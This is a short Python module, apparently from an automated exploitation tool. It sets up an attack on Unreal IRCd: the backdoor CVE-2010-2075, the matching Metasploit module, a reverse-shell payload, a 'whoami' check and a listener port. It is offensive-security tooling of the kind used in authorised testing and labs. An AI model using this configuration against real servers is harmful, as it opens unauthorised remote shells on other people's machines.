#!/usr/bin/env python3

from .base import Service

import logging

log = logging.getLogger(__name__)


class Unreal(Service):
    def __init__(self, autopwn):

        super(Unreal, self).__init__(autopwn)

        self.name = "Unreal IRCd"
        self.protocols = "TCP"
        self.ports = [6697]
        self.creds = []
        self.cves = ["CVE-2010-2075"]
        self.exploits = [
            "exploit/unix/irc/unreal_ircd_3281_backdoor"
        ]
        self.payload = "cmd/unix/reverse"
        self.verify = "whoami"
        self.LPORT = 40001
